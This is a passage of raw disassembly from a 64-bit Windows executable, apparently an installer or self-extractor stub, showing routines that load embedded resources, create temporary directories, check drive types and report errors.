   140004f99:	39 1d 9d a7 00 00    	cmp    %ebx,0xa79d(%rip)        # 0x14000f73c
   140004f9f:	75 1e                	jne    0x140004fbf
   140004fa1:	21 5c 24 28          	and    %ebx,0x28(%rsp)
   140004fa5:	45 33 c9             	xor    %r9d,%r9d
   140004fa8:	45 33 c0             	xor    %r8d,%r8d
   140004fab:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004fb2:	00 
   140004fb3:	ba f8 04 00 00       	mov    $0x4f8,%edx
   140004fb8:	33 c9                	xor    %ecx,%ecx
   140004fba:	e8 19 14 00 00       	call   0x1400063d8
   140004fbf:	f6 05 92 9e 00 00 01 	testb  $0x1,0x9e92(%rip)        # 0x14000ee58
   140004fc6:	75 27                	jne    0x140004fef
   140004fc8:	f6 05 d5 af 00 00 01 	testb  $0x1,0xafd5(%rip)        # 0x14000ffa4
   140004fcf:	75 1e                	jne    0x140004fef
   140004fd1:	48 8b 0d 10 99 00 00 	mov    0x9910(%rip),%rcx        # 0x14000e8e8
   140004fd8:	45 33 c9             	xor    %r9d,%r9d
   140004fdb:	4c 63 c3             	movslq %ebx,%r8
   140004fde:	ba a1 0f 00 00       	mov    $0xfa1,%edx
   140004fe3:	48 ff 15 56 66 00 00 	rex.W call *0x6656(%rip)        # 0x14000b640
   140004fea:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004fef:	8b c3                	mov    %ebx,%eax
   140004ff1:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004ff6:	48 83 c4 50          	add    $0x50,%rsp
   140004ffa:	5f                   	pop    %rdi
   140004ffb:	c3                   	ret
   140004ffc:	cc                   	int3
   140004ffd:	cc                   	int3
   140004ffe:	cc                   	int3
   140004fff:	cc                   	int3
   140005000:	cc                   	int3
   140005001:	cc                   	int3
   140005002:	cc                   	int3
   140005003:	cc                   	int3
   140005004:	48 83 64 24 08 00    	andq   $0x0,0x8(%rsp)
   14000500a:	8b 05 60 b0 00 00    	mov    0xb060(%rip),%eax        # 0x140010070
   140005010:	89 44 24 08          	mov    %eax,0x8(%rsp)
   140005014:	a8 10                	test   $0x10,%al
   140005016:	74 05                	je     0x14000501d
   140005018:	83 e0 01             	and    $0x1,%eax
   14000501b:	c3                   	ret
   14000501c:	cc                   	int3
   14000501d:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   140005022:	ba 03 00 00 00       	mov    $0x3,%edx
   140005027:	e9 08 00 00 00       	jmp    0x140005034
   14000502c:	cc                   	int3
   14000502d:	cc                   	int3
   14000502e:	cc                   	int3
   14000502f:	cc                   	int3
   140005030:	cc                   	int3
   140005031:	cc                   	int3
   140005032:	cc                   	int3
   140005033:	cc                   	int3
   140005034:	e9 2b 44 00 00       	jmp    0x140009464
   140005039:	cc                   	int3
   14000503a:	cc                   	int3
   14000503b:	cc                   	int3
   14000503c:	cc                   	int3
   14000503d:	cc                   	int3
   14000503e:	cc                   	int3
   14000503f:	cc                   	int3
   140005040:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005045:	57                   	push   %rdi
   140005046:	48 83 ec 30          	sub    $0x30,%rsp
   14000504a:	45 33 c0             	xor    %r8d,%r8d
   14000504d:	48 8d 0d cc 6a 00 00 	lea    0x6acc(%rip),%rcx        # 0x14000bb20
   140005054:	33 d2                	xor    %edx,%edx
   140005056:	e8 f1 02 00 00       	call   0x14000534c
   14000505b:	b9 40 00 00 00       	mov    $0x40,%ecx
   140005060:	8b f8                	mov    %eax,%edi
   140005062:	8d 50 01             	lea    0x1(%rax),%edx
   140005065:	48 c1 e2 03          	shl    $0x3,%rdx
   140005069:	48 ff 15 50 64 00 00 	rex.W call *0x6450(%rip)        # 0x14000b4c0
   140005070:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005075:	48 8b d8             	mov    %rax,%rbx
   140005078:	48 85 c0             	test   %rax,%rax
   14000507b:	75 20                	jne    0x14000509d
   14000507d:	21 44 24 28          	and    %eax,0x28(%rsp)
   140005081:	45 33 c9             	xor    %r9d,%r9d
   140005084:	45 33 c0             	xor    %r8d,%r8d
   140005087:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000508e:	00 
   14000508f:	ba b5 04 00 00       	mov    $0x4b5,%edx
   140005094:	33 c9                	xor    %ecx,%ecx
   140005096:	e8 3d 13 00 00       	call   0x1400063d8
   14000509b:	eb 74                	jmp    0x140005111
   14000509d:	44 8b c7             	mov    %edi,%r8d
   1400050a0:	48 8d 0d 79 6a 00 00 	lea    0x6a79(%rip),%rcx        # 0x14000bb20
   1400050a7:	48 8b d3             	mov    %rbx,%rdx
   1400050aa:	e8 9d 02 00 00       	call   0x14000534c
   1400050af:	85 c0                	test   %eax,%eax
   1400050b1:	75 16                	jne    0x1400050c9
   1400050b3:	21 44 24 28          	and    %eax,0x28(%rsp)
   1400050b7:	ba b1 04 00 00       	mov    $0x4b1,%edx
   1400050bc:	45 33 c0             	xor    %r8d,%r8d
   1400050bf:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400050c6:	00 
   1400050c7:	eb 2f                	jmp    0x1400050f8
   1400050c9:	48 8d 15 00 6a 00 00 	lea    0x6a00(%rip),%rdx        # 0x14000bad0
   1400050d0:	48 8b cb             	mov    %rbx,%rcx
   1400050d3:	48 ff 15 ee 62 00 00 	rex.W call *0x62ee(%rip)        # 0x14000b3c8
   1400050da:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400050df:	85 c0                	test   %eax,%eax
   1400050e1:	74 1f                	je     0x140005102
   1400050e3:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   1400050e8:	4c 8b c3             	mov    %rbx,%r8
   1400050eb:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   1400050f2:	00 
   1400050f3:	ba e9 03 00 00       	mov    $0x3e9,%edx
   1400050f8:	45 33 c9             	xor    %r9d,%r9d
   1400050fb:	33 c9                	xor    %ecx,%ecx
   1400050fd:	e8 d6 12 00 00       	call   0x1400063d8
   140005102:	48 8b cb             	mov    %rbx,%rcx
   140005105:	48 ff 15 4c 62 00 00 	rex.W call *0x624c(%rip)        # 0x14000b358
   14000510c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005111:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005116:	48 83 c4 30          	add    $0x30,%rsp
   14000511a:	5f                   	pop    %rdi
   14000511b:	c3                   	ret
   14000511c:	cc                   	int3
   14000511d:	cc                   	int3
   14000511e:	cc                   	int3
   14000511f:	cc                   	int3
   140005120:	cc                   	int3
   140005121:	cc                   	int3
   140005122:	cc                   	int3
   140005123:	cc                   	int3
   140005124:	48 83 ec 38          	sub    $0x38,%rsp
   140005128:	41 b8 24 00 00 00    	mov    $0x24,%r8d
   14000512e:	48 8d 15 cb 9c 00 00 	lea    0x9ccb(%rip),%rdx        # 0x14000ee00
   140005135:	48 8d 0d 44 6a 00 00 	lea    0x6a44(%rip),%rcx        # 0x14000bb80
   14000513c:	e8 0b 02 00 00       	call   0x14000534c
   140005141:	83 f8 24             	cmp    $0x24,%eax
   140005144:	74 2d                	je     0x140005173
   140005146:	ba b1 04 00 00       	mov    $0x4b1,%edx
   14000514b:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140005150:	45 33 c9             	xor    %r9d,%r9d
   140005153:	45 33 c0             	xor    %r8d,%r8d
   140005156:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000515d:	00 
   14000515e:	33 c9                	xor    %ecx,%ecx
   140005160:	e8 73 12 00 00       	call   0x1400063d8
   140005165:	c7 05 15 a5 00 00 14 	movl   $0x80070714,0xa515(%rip)        # 0x14000f684
   14000516c:	07 07 80 
   14000516f:	33 c0                	xor    %eax,%eax
   140005171:	eb 65                	jmp    0x1400051d8
   140005173:	8b 05 a7 9c 00 00    	mov    0x9ca7(%rip),%eax        # 0x14000ee20
   140005179:	89 05 e5 a7 00 00    	mov    %eax,0xa7e5(%rip)        # 0x14000f964
   14000517f:	85 c0                	test   %eax,%eax
   140005181:	75 07                	jne    0x14000518a
   140005183:	ba c6 04 00 00       	mov    $0x4c6,%edx
   140005188:	eb c1                	jmp    0x14000514b
   14000518a:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140005190:	48 8d 15 11 ae 00 00 	lea    0xae11(%rip),%rdx        # 0x14000ffa8
   140005197:	48 8d 0d f2 69 00 00 	lea    0x69f2(%rip),%rcx        # 0x14000bb90
   14000519e:	e8 a9 01 00 00       	call   0x14000534c
   1400051a3:	48 8d 0d c6 1e 00 00 	lea    0x1ec6(%rip),%rcx        # 0x140007070
   1400051aa:	e8 b9 2c 00 00       	call   0x140007e68
   1400051af:	85 c0                	test   %eax,%eax
   1400051b1:	75 20                	jne    0x1400051d3
   1400051b3:	21 44 24 28          	and    %eax,0x28(%rsp)
   1400051b7:	45 33 c9             	xor    %r9d,%r9d
   1400051ba:	45 33 c0             	xor    %r8d,%r8d
   1400051bd:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400051c4:	00 
   1400051c5:	ba c6 04 00 00       	mov    $0x4c6,%edx
   1400051ca:	33 c9                	xor    %ecx,%ecx
   1400051cc:	e8 07 12 00 00       	call   0x1400063d8
   1400051d1:	eb 9c                	jmp    0x14000516f
   1400051d3:	b8 01 00 00 00       	mov    $0x1,%eax
   1400051d8:	48 83 c4 38          	add    $0x38,%rsp
   1400051dc:	c3                   	ret
   1400051dd:	cc                   	int3
   1400051de:	cc                   	int3
   1400051df:	cc                   	int3
   1400051e0:	cc                   	int3
   1400051e1:	cc                   	int3
   1400051e2:	cc                   	int3
   1400051e3:	cc                   	int3
   1400051e4:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400051e9:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400051ee:	56                   	push   %rsi
   1400051ef:	57                   	push   %rdi
   1400051f0:	41 56                	push   %r14
   1400051f2:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   1400051f9:	48 8b 05 80 8e 00 00 	mov    0x8e80(%rip),%rax        # 0x14000e080
   140005200:	48 33 c4             	xor    %rsp,%rax
   140005203:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   14000520a:	00 
   14000520b:	33 f6                	xor    %esi,%esi
   14000520d:	33 ff                	xor    %edi,%edi
   14000520f:	4c 8b f1             	mov    %rcx,%r14
   140005212:	48 8b da             	mov    %rdx,%rbx
   140005215:	4c 2b f2             	sub    %rdx,%r14
   140005218:	48 8b e9             	mov    %rcx,%rbp
   14000521b:	44 8b ce             	mov    %esi,%r9d
   14000521e:	4c 8d 05 83 69 00 00 	lea    0x6983(%rip),%r8        # 0x14000bba8
   140005225:	ba 04 01 00 00       	mov    $0x104,%edx
   14000522a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000522f:	e8 14 e6 ff ff       	call   0x140003848
   140005234:	ff c6                	inc    %esi
   140005236:	ba 04 01 00 00       	mov    $0x104,%edx
   14000523b:	48 8b cb             	mov    %rbx,%rcx
   14000523e:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140005245:	48 85 c0             	test   %rax,%rax
   140005248:	74 13                	je     0x14000525d
   14000524a:	41 8a 04 0e          	mov    (%r14,%rcx,1),%al
   14000524e:	84 c0                	test   %al,%al
   140005250:	74 0b                	je     0x14000525d
   140005252:	88 01                	mov    %al,(%rcx)
   140005254:	48 ff c1             	inc    %rcx
   140005257:	48 83 ea 01          	sub    $0x1,%rdx
   14000525b:	75 e1                	jne    0x14000523e
   14000525d:	48 85 d2             	test   %rdx,%rdx
   140005260:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140005264:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140005269:	ba 04 01 00 00       	mov    $0x104,%edx
   14000526e:	48 0f 45 c1          	cmovne %rcx,%rax
   140005272:	48 8b cb             	mov    %rbx,%rcx
   140005275:	40 88 38             	mov    %dil,(%rax)
   140005278:	e8 5f 43 00 00       	call   0x1400095dc
   14000527d:	48 8b cb             	mov    %rbx,%rcx
   140005280:	48 ff 15 d9 60 00 00 	rex.W call *0x60d9(%rip)        # 0x14000b360
   140005287:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000528c:	48 8b cb             	mov    %rbx,%rcx
   14000528f:	48 ff 15 5a 60 00 00 	rex.W call *0x605a(%rip)        # 0x14000b2f0
   140005296:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000529b:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000529e:	74 7c                	je     0x14000531c
   1400052a0:	81 fe 90 01 00 00    	cmp    $0x190,%esi
   1400052a6:	0f 8c 6f ff ff ff    	jl     0x14000521b
   1400052ac:	4c 8b cb             	mov    %rbx,%r9
   1400052af:	48 8d 15 fe 68 00 00 	lea    0x68fe(%rip),%rdx        # 0x14000bbb4
   1400052b6:	45 33 c0             	xor    %r8d,%r8d
   1400052b9:	48 8b cd             	mov    %rbp,%rcx
   1400052bc:	48 ff 15 cd 61 00 00 	rex.W call *0x61cd(%rip)        # 0x14000b490
   1400052c3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400052c8:	85 c0                	test   %eax,%eax
   1400052ca:	74 25                	je     0x1400052f1
   1400052cc:	48 8b cb             	mov    %rbx,%rcx
   1400052cf:	bf 01 00 00 00       	mov    $0x1,%edi
   1400052d4:	48 ff 15 2d 60 00 00 	rex.W call *0x602d(%rip)        # 0x14000b308
   1400052db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400052e0:	33 d2                	xor    %edx,%edx
   1400052e2:	48 8b cb             	mov    %rbx,%rcx
   1400052e5:	48 ff 15 8c 60 00 00 	rex.W call *0x608c(%rip)        # 0x14000b378
   1400052ec:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400052f1:	8b c7                	mov    %edi,%eax
   1400052f3:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   1400052fa:	00 
   1400052fb:	48 33 cc             	xor    %rsp,%rcx
   1400052fe:	e8 ad 48 00 00       	call   0x140009bb0
   140005303:	4c 8d 9c 24 40 01 00 	lea    0x140(%rsp),%r11
   14000530a:	00 
   14000530b:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000530f:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   140005313:	49 8b e3             	mov    %r11,%rsp
   140005316:	41 5e                	pop    %r14
   140005318:	5f                   	pop    %rdi
   140005319:	5e                   	pop    %rsi
   14000531a:	c3                   	ret
   14000531b:	cc                   	int3
   14000531c:	33 d2                	xor    %edx,%edx
   14000531e:	48 8b cb             	mov    %rbx,%rcx
   140005321:	48 ff 15 50 60 00 00 	rex.W call *0x6050(%rip)        # 0x14000b378
   140005328:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000532d:	85 c0                	test   %eax,%eax
   14000532f:	0f 84 77 ff ff ff    	je     0x1400052ac
   140005335:	c7 05 01 9b 00 00 01 	movl   $0x1,0x9b01(%rip)        # 0x14000ee40
   14000533c:	00 00 00 
   14000533f:	bf 01 00 00 00       	mov    $0x1,%edi
   140005344:	eb ab                	jmp    0x1400052f1
   140005346:	cc                   	int3
   140005347:	cc                   	int3
   140005348:	cc                   	int3
   140005349:	cc                   	int3
   14000534a:	cc                   	int3
   14000534b:	cc                   	int3
   14000534c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005351:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005356:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000535b:	57                   	push   %rdi
   14000535c:	48 83 ec 20          	sub    $0x20,%rsp
   140005360:	48 8b f2             	mov    %rdx,%rsi
   140005363:	41 8b e8             	mov    %r8d,%ebp
   140005366:	48 8b d1             	mov    %rcx,%rdx
   140005369:	48 8b f9             	mov    %rcx,%rdi
   14000536c:	33 c9                	xor    %ecx,%ecx
   14000536e:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140005374:	48 ff 15 5d 60 00 00 	rex.W call *0x605d(%rip)        # 0x14000b3d8
   14000537b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005380:	48 8b d0             	mov    %rax,%rdx
   140005383:	33 c9                	xor    %ecx,%ecx
   140005385:	48 ff 15 14 60 00 00 	rex.W call *0x6014(%rip)        # 0x14000b3a0
   14000538c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005391:	8b d8                	mov    %eax,%ebx
   140005393:	3b c5                	cmp    %ebp,%eax
   140005395:	77 6e                	ja     0x140005405
   140005397:	48 85 f6             	test   %rsi,%rsi
   14000539a:	74 69                	je     0x140005405
   14000539c:	85 c0                	test   %eax,%eax
   14000539e:	74 7d                	je     0x14000541d
   1400053a0:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   1400053a6:	48 8b d7             	mov    %rdi,%rdx
   1400053a9:	33 c9                	xor    %ecx,%ecx
   1400053ab:	48 ff 15 26 60 00 00 	rex.W call *0x6026(%rip)        # 0x14000b3d8
   1400053b2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400053b7:	48 8b d0             	mov    %rax,%rdx
   1400053ba:	33 c9                	xor    %ecx,%ecx
   1400053bc:	48 ff 15 a5 60 00 00 	rex.W call *0x60a5(%rip)        # 0x14000b468
   1400053c3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400053c8:	48 8b c8             	mov    %rax,%rcx
   1400053cb:	48 ff 15 76 60 00 00 	rex.W call *0x6076(%rip)        # 0x14000b448
   1400053d2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400053d7:	48 8b f8             	mov    %rax,%rdi
   1400053da:	48 85 c0             	test   %rax,%rax
   1400053dd:	74 3e                	je     0x14000541d
   1400053df:	44 8b cb             	mov    %ebx,%r9d
   1400053e2:	8b d5                	mov    %ebp,%edx
   1400053e4:	4c 8b c0             	mov    %rax,%r8
   1400053e7:	48 8b ce             	mov    %rsi,%rcx
   1400053ea:	48 ff 15 2f 63 00 00 	rex.W call *0x632f(%rip)        # 0x14000b720
   1400053f1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400053f6:	48 8b cf             	mov    %rdi,%rcx
   1400053f9:	48 ff 15 00 60 00 00 	rex.W call *0x6000(%rip)        # 0x14000b400
   140005400:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005405:	8b c3                	mov    %ebx,%eax
   140005407:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000540c:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140005411:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005416:	48 83 c4 20          	add    $0x20,%rsp
   14000541a:	5f                   	pop    %rdi
   14000541b:	c3                   	ret
   14000541c:	cc                   	int3
   14000541d:	33 c0                	xor    %eax,%eax
   14000541f:	eb e6                	jmp    0x140005407
   140005421:	cc                   	int3
   140005422:	cc                   	int3
   140005423:	cc                   	int3
   140005424:	cc                   	int3
   140005425:	cc                   	int3
   140005426:	cc                   	int3
   140005427:	cc                   	int3
   140005428:	48 8b c4             	mov    %rsp,%rax
   14000542b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000542f:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140005433:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140005437:	4c 89 60 20          	mov    %r12,0x20(%rax)
   14000543b:	55                   	push   %rbp
   14000543c:	41 56                	push   %r14
   14000543e:	41 57                	push   %r15
   140005440:	48 8d 68 88          	lea    -0x78(%rax),%rbp
   140005444:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   14000544b:	48 8b 05 2e 8c 00 00 	mov    0x8c2e(%rip),%rax        # 0x14000e080
   140005452:	48 33 c4             	xor    %rsp,%rax
   140005455:	48 89 45 50          	mov    %rax,0x50(%rbp)
   140005459:	45 33 c0             	xor    %r8d,%r8d
   14000545c:	48 8d 0d 9d 66 00 00 	lea    0x669d(%rip),%rcx        # 0x14000bb00
   140005463:	33 d2                	xor    %edx,%edx
   140005465:	e8 e2 fe ff ff       	call   0x14000534c
   14000546a:	b9 40 00 00 00       	mov    $0x40,%ecx
   14000546f:	8b f0                	mov    %eax,%esi
   140005471:	8d 50 01             	lea    0x1(%rax),%edx
   140005474:	48 ff 15 45 60 00 00 	rex.W call *0x6045(%rip)        # 0x14000b4c0
   14000547b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005480:	33 db                	xor    %ebx,%ebx
   140005482:	48 8b f8             	mov    %rax,%rdi
   140005485:	48 85 c0             	test   %rax,%rax
   140005488:	75 30                	jne    0x1400054ba
   14000548a:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   14000548e:	45 33 c9             	xor    %r9d,%r9d
   140005491:	45 33 c0             	xor    %r8d,%r8d
   140005494:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000549b:	00 
   14000549c:	ba b5 04 00 00       	mov    $0x4b5,%edx
   1400054a1:	33 c9                	xor    %ecx,%ecx
   1400054a3:	e8 30 0f 00 00       	call   0x1400063d8
   1400054a8:	e8 d3 12 00 00       	call   0x140006780
   1400054ad:	89 05 d1 a1 00 00    	mov    %eax,0xa1d1(%rip)        # 0x14000f684
   1400054b3:	33 c0                	xor    %eax,%eax
   1400054b5:	e9 d3 03 00 00       	jmp    0x14000588d
   1400054ba:	44 8b c6             	mov    %esi,%r8d
   1400054bd:	48 8d 0d 3c 66 00 00 	lea    0x663c(%rip),%rcx        # 0x14000bb00
   1400054c4:	48 8b d7             	mov    %rdi,%rdx
   1400054c7:	e8 80 fe ff ff       	call   0x14000534c
   1400054cc:	85 c0                	test   %eax,%eax
   1400054ce:	75 39                	jne    0x140005509
   1400054d0:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400054d4:	45 33 c9             	xor    %r9d,%r9d
   1400054d7:	45 33 c0             	xor    %r8d,%r8d
   1400054da:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400054e1:	00 
   1400054e2:	ba b1 04 00 00       	mov    $0x4b1,%edx
   1400054e7:	33 c9                	xor    %ecx,%ecx
   1400054e9:	e8 ea 0e 00 00       	call   0x1400063d8
   1400054ee:	48 8b cf             	mov    %rdi,%rcx
   1400054f1:	48 ff 15 60 5e 00 00 	rex.W call *0x5e60(%rip)        # 0x14000b358
   1400054f8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400054fd:	c7 05 7d a1 00 00 14 	movl   $0x80070714,0xa17d(%rip)        # 0x14000f684
   140005504:	07 07 80 
   140005507:	eb aa                	jmp    0x1400054b3
   140005509:	48 8d 15 c0 65 00 00 	lea    0x65c0(%rip),%rdx        # 0x14000bad0
   140005510:	48 8b cf             	mov    %rdi,%rcx
   140005513:	48 ff 15 ae 5e 00 00 	rex.W call *0x5eae(%rip)        # 0x14000b3c8
   14000551a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000551f:	41 be 01 00 00 00    	mov    $0x1,%r14d
   140005525:	85 c0                	test   %eax,%eax
   140005527:	75 07                	jne    0x140005530
   140005529:	44 89 35 70 aa 00 00 	mov    %r14d,0xaa70(%rip)        # 0x14000ffa0
   140005530:	48 8b cf             	mov    %rdi,%rcx
   140005533:	48 ff 15 1e 5e 00 00 	rex.W call *0x5e1e(%rip)        # 0x14000b358
   14000553a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000553f:	8a 05 19 9a 00 00    	mov    0x9a19(%rip),%al        # 0x14000ef5e
   140005545:	84 c0                	test   %al,%al
   140005547:	74 4b                	je     0x140005594
   140005549:	3c 5c                	cmp    $0x5c,%al
   14000554b:	75 0b                	jne    0x140005558
   14000554d:	38 05 0c 9a 00 00    	cmp    %al,0x9a0c(%rip)        # 0x14000ef5f
   140005553:	44 8b c3             	mov    %ebx,%r8d
   140005556:	74 03                	je     0x14000555b
   140005558:	45 8b c6             	mov    %r14d,%r8d
   14000555b:	33 d2                	xor    %edx,%edx
   14000555d:	48 8d 0d fa 99 00 00 	lea    0x99fa(%rip),%rcx        # 0x14000ef5e
   140005564:	e8 5b ee ff ff       	call   0x1400043c4
   140005569:	85 c0                	test   %eax,%eax
   14000556b:	0f 85 f1 02 00 00    	jne    0x140005862
   140005571:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140005575:	45 33 c9             	xor    %r9d,%r9d
   140005578:	45 33 c0             	xor    %r8d,%r8d
   14000557b:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140005582:	00 
   140005583:	ba be 04 00 00       	mov    $0x4be,%edx
   140005588:	33 c9                	xor    %ecx,%ecx
   14000558a:	e8 49 0e 00 00       	call   0x1400063d8
   14000558f:	e9 1f ff ff ff       	jmp    0x1400054b3
   140005594:	39 1d aa 98 00 00    	cmp    %ebx,0x98aa(%rip)        # 0x14000ee44
   14000559a:	0f 85 c7 02 00 00    	jne    0x140005867
   1400055a0:	39 1d fa a9 00 00    	cmp    %ebx,0xa9fa(%rip)        # 0x14000ffa0
   1400055a6:	0f 85 bb 02 00 00    	jne    0x140005867
   1400055ac:	4c 8d 3d 9d a1 00 00 	lea    0xa19d(%rip),%r15        # 0x14000f750
   1400055b3:	49 8b d7             	mov    %r15,%rdx
   1400055b6:	e8 ed 11 00 00       	call   0x1400067a8
   1400055bb:	85 c0                	test   %eax,%eax
   1400055bd:	74 3b                	je     0x1400055fa
   1400055bf:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   1400055c5:	41 8b d6             	mov    %r14d,%edx
   1400055c8:	49 8b cf             	mov    %r15,%rcx
   1400055cb:	e8 f4 ed ff ff       	call   0x1400043c4
   1400055d0:	85 c0                	test   %eax,%eax
   1400055d2:	0f 85 8a 02 00 00    	jne    0x140005862
   1400055d8:	49 8b cf             	mov    %r15,%rcx
   1400055db:	e8 18 df ff ff       	call   0x1400034f8
   1400055e0:	85 c0                	test   %eax,%eax
   1400055e2:	75 16                	jne    0x1400055fa
   1400055e4:	45 8b c6             	mov    %r14d,%r8d
   1400055e7:	41 8b d6             	mov    %r14d,%edx
   1400055ea:	49 8b cf             	mov    %r15,%rcx
   1400055ed:	e8 d2 ed ff ff       	call   0x1400043c4
   1400055f2:	85 c0                	test   %eax,%eax
   1400055f4:	0f 85 68 02 00 00    	jne    0x140005862
   1400055fa:	48 8d 35 d3 65 00 00 	lea    0x65d3(%rip),%rsi        # 0x14000bbd4
   140005601:	41 bc 04 01 00 00    	mov    $0x104,%r12d
   140005607:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000560c:	48 2b f0             	sub    %rax,%rsi
   14000560f:	49 8b d4             	mov    %r12,%rdx
   140005612:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005617:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   14000561e:	48 85 c0             	test   %rax,%rax
   140005621:	74 11                	je     0x140005634
   140005623:	8a 04 0e             	mov    (%rsi,%rcx,1),%al
   140005626:	84 c0                	test   %al,%al
   140005628:	74 0a                	je     0x140005634
   14000562a:	88 01                	mov    %al,(%rcx)
   14000562c:	49 03 ce             	add    %r14,%rcx
   14000562f:	49 2b d6             	sub    %r14,%rdx
   140005632:	75 e3                	jne    0x140005617
   140005634:	48 85 d2             	test   %rdx,%rdx
   140005637:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   14000563b:	48 0f 45 c1          	cmovne %rcx,%rax
   14000563f:	88 18                	mov    %bl,(%rax)
   140005641:	80 7c 24 40 5a       	cmpb   $0x5a,0x40(%rsp)
   140005646:	0f 8f e2 01 00 00    	jg     0x14000582e
   14000564c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005651:	48 ff 15 60 5d 00 00 	rex.W call *0x5d60(%rip)        # 0x14000b3b8
   140005658:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000565d:	8b f8                	mov    %eax,%edi
   14000565f:	83 f8 06             	cmp    $0x6,%eax
   140005662:	74 05                	je     0x140005669
   140005664:	83 f8 03             	cmp    $0x3,%eax
   140005667:	75 1a                	jne    0x140005683
   140005669:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000566e:	48 ff 15 7b 5c 00 00 	rex.W call *0x5c7b(%rip)        # 0x14000b2f0
   140005675:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000567a:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000567d:	0f 85 8d 00 00 00    	jne    0x140005710
   140005683:	83 ff 02             	cmp    $0x2,%edi
   140005686:	75 78                	jne    0x140005700
   140005688:	8a 4c 24 40          	mov    0x40(%rsp),%cl
   14000568c:	8d 41 bf             	lea    -0x41(%rcx),%eax
   14000568f:	41 3a c6             	cmp    %r14b,%al
   140005692:	76 70                	jbe    0x140005704
   140005694:	89 5c 24 34          	mov    %ebx,0x34(%rsp)
   140005698:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   14000569c:	89 5c 24 3c          	mov    %ebx,0x3c(%rsp)
   1400056a0:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   1400056a4:	84 c9                	test   %cl,%cl
   1400056a6:	74 5c                	je     0x140005704
   1400056a8:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   1400056ad:	4c 8d 4c 24 3c       	lea    0x3c(%rsp),%r9
   1400056b2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400056b7:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
